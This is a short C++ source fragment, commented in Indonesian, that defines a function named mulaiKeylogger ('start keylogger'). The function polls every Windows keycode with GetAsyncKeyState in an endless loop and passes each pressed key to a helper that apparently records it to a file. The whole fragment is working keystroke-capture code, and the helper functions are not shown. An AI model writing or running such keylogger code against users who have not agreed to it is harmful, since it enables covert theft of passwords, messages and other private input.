void mulaiKeylogger(string namaBerkas){
	
	// Mengulang terus menerus
	while(1){
		
		// Perulangan kemungkinan semua keycode Windows API sebanyak 2 byte = 256 keycode
		for(int i = 0; i < 0xFF; i++){
			
			// Pengguna menekan keyboard
			if(GetAsyncKeyState(i) & 0x8000 ){
				
				// Keycode yang ditekan diolah pada fungsi olahMasukan
				olahMasukan(namaBerkas, i);
				//cout << i << endl;
				
				// Berhenti sebentar
				Sleep(durasiTidur);
			}
		}
	}
}
